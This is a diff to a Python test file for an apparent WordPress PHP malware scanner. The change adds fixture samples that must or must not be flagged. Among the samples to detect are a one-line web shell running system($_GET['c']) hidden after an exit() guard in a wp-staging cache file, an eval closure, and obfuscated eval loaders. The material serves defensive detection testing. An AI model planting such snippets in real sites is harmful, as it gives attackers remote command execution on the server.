@@ -13,6 +13,8 @@ def tanda(nama, isi):
 
 WPC = b"<?php\ndefine( 'DB_NAME', '%s' );\ndefine( 'DB_USER', 'u' );\ndefine( 'DB_PASSWORD', 'x' );\ndefine( 'DB_HOST', '%s' );\n"
 KENA = [
+    ('wp-content/uploads/wp-staging/x.cache.php', b'<?php exit(); ?>\n{"a":1}<?php system($_GET["c"]); ?>', 'VD.PHP.DiUploads'),
+    ('wp-content/uploads/wp-staging/y.cache.php', b'<?php if ($_GET["k"]) exit(); ?>\n{"a":1}', 'VD.PHP.DiUploads'),
     ('wp-content/uploads/backwpup/index.php', b"<?php\nheader( 'Location: https://x.example/' );\n", 'VD.PHP.DiUploads'),
     ('3PJcpMFsD8B.php', b'<?php\n$h= \t\tfunction ($c) {\r\n    EVAL \t\t($c);\r\n};', 'VD.PHP.EvalClosure'),
     ('x/index.php', b"<?php define('O0O0O0', 'O0O00O');$GLOBALS[O0O0O0] = explode('|H|Z|8', 'ini_set|H|Z|8eval');", 'VD.PHP.GlobalsExplode'),
@@ -50,6 +52,7 @@ for nama, isi, harap in KENA:
     assert harap in tanda(nama, isi), (nama, harap, tanda(nama, isi))
 
 AMAN = [
+    ('wp-content/uploads/wp-staging/clone_options.cache.php', b'<?php exit(); ?>\n{"existingClones":{"1":{"path":"\\/home\\/u\\/x\\/","prefix":"wpstg0_"' + b',"t":"' + b'a' * 5000 + b'"}}}'),
     ('wp-content/uploads/backwpup/index.php', b"<?php\nheader( $_SERVER['SERVER_PROTOCOL'] . ' 404 Not Found' );\nheader( 'Status: 404 Not Found' );\n"),
     ('wp-content/plugins/x/a.php', b"<?php $f = function ($x) { return eval_helper($x); }; $GLOBALS['wp_filter'] = explode(',', $s);"),
     ('wp-content/plugins/x/b.php', b"<?php $hash = '7068705f'; $s = strrev($nama); $p = str_split($teks, 1);"),
